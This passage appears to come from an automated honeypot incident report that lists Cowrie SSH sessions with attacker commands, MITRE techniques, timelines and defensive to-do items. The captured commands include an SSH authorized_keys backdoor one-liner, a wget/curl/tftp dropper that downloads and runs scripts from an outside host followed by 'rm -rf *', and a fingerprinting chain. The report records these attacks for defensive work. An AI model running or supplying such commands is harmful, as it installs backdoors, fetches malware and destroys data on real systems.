| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.log.closed` |
| `2026-09-25 15:13:24` | `cowrie.session.params` |
| `2026-09-25 15:13:24` | `cowrie.command.input` |
| `2026-09-25 15:13:24` | `cowrie.log.closed` |
| `2026-09-25 15:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf37f910108

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:15 |
| **Last Seen** | 2026-09-25 15:15 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:15:23` | `cowrie.session.connect` |
| `2026-09-25 15:15:26` | `cowrie.client.version` |
| `2026-09-25 15:15:26` | `cowrie.client.kex` |
| `2026-09-25 15:15:34` | `cowrie.login.success` |
| `2026-09-25 15:15:35` | `cowrie.session.params` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.success` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.command.input` |
| `2026-09-25 15:15:35` | `cowrie.log.closed` |
| `2026-09-25 15:15:36` | `cowrie.session.params` |
| `2026-09-25 15:15:36` | `cowrie.command.input` |
| `2026-09-25 15:15:38` | `cowrie.log.closed` |
| `2026-09-25 15:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ea8546e72b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:17 |
| **Last Seen** | 2026-09-25 15:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:17:31` | `cowrie.session.connect` |
| `2026-09-25 15:17:35` | `cowrie.client.version` |
| `2026-09-25 15:17:35` | `cowrie.client.kex` |
| `2026-09-25 15:17:40` | `cowrie.login.success` |
| `2026-09-25 15:17:42` | `cowrie.session.params` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.success` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.command.input` |
| `2026-09-25 15:17:42` | `cowrie.log.closed` |
| `2026-09-25 15:17:43` | `cowrie.session.params` |
| `2026-09-25 15:17:43` | `cowrie.command.input` |
| `2026-09-25 15:17:43` | `cowrie.log.closed` |
| `2026-09-25 15:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29467dd9843f

| Field | Detail |
|---|---|
| **Source IP** | `41.221.49[.]85` |
| **First Seen** | 2026-09-25 15:37 |
| **Last Seen** | 2026-09-25 15:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:37:38` | `cowrie.session.connect` |
| `2026-09-25 15:37:38` | `cowrie.client.version` |
| `2026-09-25 15:37:38` | `cowrie.client.kex` |
| `2026-09-25 15:37:39` | `cowrie.login.success` |
| `2026-09-25 15:37:40` | `cowrie.session.params` |
| `2026-09-25 15:37:40` | `cowrie.command.input` |
| `2026-09-25 15:37:40` | `cowrie.command.failed` |
| `2026-09-25 15:37:41` | `cowrie.log.closed` |
| `2026-09-25 15:37:41` | `cowrie.session.params` |
| `2026-09-25 15:37:41` | `cowrie.command.input` |
| `2026-09-25 15:37:42` | `cowrie.session.file_download` |
| `2026-09-25 15:37:42` | `cowrie.log.closed` |
| `2026-09-25 15:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.221.49[.]85` to AbuseIPDB if not already reported
- [ ] Block `41.221.49[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33fbf908cfda

| Field | Detail |
|---|---|
| **Source IP** | `41.221.49[.]85` |
| **First Seen** | 2026-09-25 15:37 |
| **Last Seen** | 2026-09-25 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:37:42` | `cowrie.session.connect` |
| `2026-09-25 15:37:42` | `cowrie.client.version` |
| `2026-09-25 15:37:42` | `cowrie.client.kex` |
| `2026-09-25 15:37:43` | `cowrie.login.success` |
| `2026-09-25 15:37:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.221.49[.]85` to AbuseIPDB if not already reported
- [ ] Block `41.221.49[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7622c6925b63

| Field | Detail |
|---|---|
| **Source IP** | `41.221.49[.]85` |
| **First Seen** | 2026-09-25 15:37 |
| **Last Seen** | 2026-09-25 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:37:43` | `cowrie.session.connect` |
| `2026-09-25 15:37:43` | `cowrie.client.version` |
| `2026-09-25 15:37:44` | `cowrie.client.kex` |
| `2026-09-25 15:37:45` | `cowrie.login.success` |
| `2026-09-25 15:37:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.221.49[.]85` to AbuseIPDB if not already reported
- [ ] Block `41.221.49[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc67dc4bff0

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-09-25 15:46 |
| **Last Seen** | 2026-09-25 15:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:46:59` | `cowrie.session.connect` |
| `2026-09-25 15:46:59` | `cowrie.client.version` |
| `2026-09-25 15:46:59` | `cowrie.client.kex` |
| `2026-09-25 15:47:00` | `cowrie.login.success` |
| `2026-09-25 15:47:01` | `cowrie.session.params` |
| `2026-09-25 15:47:01` | `cowrie.command.input` |
| `2026-09-25 15:47:01` | `cowrie.command.failed` |
| `2026-09-25 15:47:01` | `cowrie.log.closed` |
| `2026-09-25 15:47:02` | `cowrie.session.params` |
| `2026-09-25 15:47:02` | `cowrie.command.input` |
| `2026-09-25 15:47:02` | `cowrie.session.file_download` |
| `2026-09-25 15:47:02` | `cowrie.log.closed` |
| `2026-09-25 15:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01178d930d3b

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-09-25 15:47 |
| **Last Seen** | 2026-09-25 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:47:02` | `cowrie.session.connect` |
| `2026-09-25 15:47:02` | `cowrie.client.version` |
| `2026-09-25 15:47:02` | `cowrie.client.kex` |
| `2026-09-25 15:47:03` | `cowrie.login.success` |
| `2026-09-25 15:47:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22f39b128849

| Field | Detail |
|---|---|
| **Source IP** | `20.243.208[.]191` |
| **First Seen** | 2026-09-25 15:47 |
| **Last Seen** | 2026-09-25 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:47:03` | `cowrie.session.connect` |
| `2026-09-25 15:47:03` | `cowrie.client.version` |
| `2026-09-25 15:47:03` | `cowrie.client.kex` |
| `2026-09-25 15:47:04` | `cowrie.login.success` |
| `2026-09-25 15:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.243.208[.]191` to AbuseIPDB if not already reported
- [ ] Block `20.243.208[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a75c76bbd14

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-25 15:53 |
| **Last Seen** | 2026-09-25 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:53:51` | `cowrie.session.connect` |
| `2026-09-25 15:53:51` | `cowrie.client.version` |
| `2026-09-25 15:53:51` | `cowrie.client.kex` |
| `2026-09-25 15:53:51` | `cowrie.login.success` |
| `2026-09-25 15:53:52` | `cowrie.direct-tcpip.request` |
| `2026-09-25 15:53:52` | `cowrie.direct-tcpip.data` |
| `2026-09-25 15:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f6f342de50

| Field | Detail |
|---|---|
| **Source IP** | `130.131.220[.]95` |
| **First Seen** | 2026-09-25 17:06 |
| **Last Seen** | 2026-09-25 17:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:06:38` | `cowrie.session.connect` |
| `2026-09-25 17:06:38` | `cowrie.client.version` |
| `2026-09-25 17:06:38` | `cowrie.client.kex` |
| `2026-09-25 17:06:38` | `cowrie.login.success` |
| `2026-09-25 17:06:39` | `cowrie.session.params` |
| `2026-09-25 17:06:39` | `cowrie.command.input` |
| `2026-09-25 17:06:39` | `cowrie.command.failed` |
| `2026-09-25 17:06:39` | `cowrie.log.closed` |
| `2026-09-25 17:06:39` | `cowrie.session.params` |
| `2026-09-25 17:06:39` | `cowrie.command.input` |
| `2026-09-25 17:06:40` | `cowrie.session.file_download` |
| `2026-09-25 17:06:40` | `cowrie.log.closed` |
| `2026-09-25 17:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.131.220[.]95` to AbuseIPDB if not already reported
- [ ] Block `130.131.220[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b143dca3cd9

| Field | Detail |
|---|---|
| **Source IP** | `130.131.220[.]95` |
| **First Seen** | 2026-09-25 17:06 |
| **Last Seen** | 2026-09-25 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:06:40` | `cowrie.session.connect` |
| `2026-09-25 17:06:40` | `cowrie.client.version` |
| `2026-09-25 17:06:40` | `cowrie.client.kex` |
| `2026-09-25 17:06:40` | `cowrie.login.success` |
| `2026-09-25 17:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.131.220[.]95` to AbuseIPDB if not already reported
- [ ] Block `130.131.220[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee9afd7b21e2

| Field | Detail |
|---|---|
| **Source IP** | `130.131.220[.]95` |
| **First Seen** | 2026-09-25 17:06 |
| **Last Seen** | 2026-09-25 17:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:06:40` | `cowrie.session.connect` |
| `2026-09-25 17:06:40` | `cowrie.client.version` |
| `2026-09-25 17:06:40` | `cowrie.client.kex` |
| `2026-09-25 17:06:40` | `cowrie.login.success` |
| `2026-09-25 17:06:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.131.220[.]95` to AbuseIPDB if not already reported
- [ ] Block `130.131.220[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488daf4998cb

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-09-25 17:12 |
| **Last Seen** | 2026-09-25 17:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:12:27` | `cowrie.session.connect` |
| `2026-09-25 17:12:27` | `cowrie.client.version` |
| `2026-09-25 17:12:27` | `cowrie.client.kex` |
| `2026-09-25 17:12:28` | `cowrie.login.success` |
| `2026-09-25 17:12:28` | `cowrie.session.params` |
| `2026-09-25 17:12:28` | `cowrie.command.input` |
| `2026-09-25 17:12:28` | `cowrie.command.failed` |
| `2026-09-25 17:12:29` | `cowrie.log.closed` |
| `2026-09-25 17:12:30` | `cowrie.session.params` |
| `2026-09-25 17:12:30` | `cowrie.command.input` |
| `2026-09-25 17:12:30` | `cowrie.session.file_download` |
| `2026-09-25 17:12:30` | `cowrie.log.closed` |
| `2026-09-25 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5c17a2c22b

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-09-25 17:12 |
| **Last Seen** | 2026-09-25 17:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:12:30` | `cowrie.session.connect` |
| `2026-09-25 17:12:30` | `cowrie.client.version` |
| `2026-09-25 17:12:30` | `cowrie.client.kex` |
| `2026-09-25 17:12:31` | `cowrie.login.success` |
| `2026-09-25 17:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf09d606d4cb

| Field | Detail |
|---|---|
| **Source IP** | `201.71.192[.]108` |
| **First Seen** | 2026-09-25 17:12 |
| **Last Seen** | 2026-09-25 17:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:12:31` | `cowrie.session.connect` |
| `2026-09-25 17:12:31` | `cowrie.client.version` |
| `2026-09-25 17:12:31` | `cowrie.client.kex` |
| `2026-09-25 17:12:31` | `cowrie.login.success` |
| `2026-09-25 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.71.192[.]108` to AbuseIPDB if not already reported
- [ ] Block `201.71.192[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcada238e967

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-25 17:18 |
| **Last Seen** | 2026-09-25 17:19 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:18:52` | `cowrie.session.connect` |
| `2026-09-25 17:18:52` | `cowrie.login.success` |
| `2026-09-25 17:18:52` | `cowrie.session.params` |
| `2026-09-25 17:18:54` | `cowrie.command.input` |
| `2026-09-25 17:18:54` | `cowrie.command.input` |
| `2026-09-25 17:19:04` | `cowrie.session.file_download.failed` |
| `2026-09-25 17:19:09` | `cowrie.log.closed` |
| `2026-09-25 17:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a5bf58e99a

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-25 17:27 |
| **Last Seen** | 2026-09-25 17:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:27:20` | `cowrie.session.connect` |
| `2026-09-25 17:27:20` | `cowrie.login.success` |
| `2026-09-25 17:27:21` | `cowrie.session.params` |
| `2026-09-25 17:27:22` | `cowrie.command.input` |
| `2026-09-25 17:27:22` | `cowrie.command.input` |
| `2026-09-25 17:27:32` | `cowrie.session.file_download.failed` |
| `2026-09-25 17:27:37` | `cowrie.log.closed` |
| `2026-09-25 17:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd5a2b65f47

| Field | Detail |
|---|---|
| **Source IP** | `198.98.62[.]211` |
| **First Seen** | 2026-09-25 17:29 |
| **Last Seen** | 2026-09-25 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 17:29:52` | `cowrie.session.connect` |
| `2026-09-25 17:29:52` | `cowrie.client.version` |
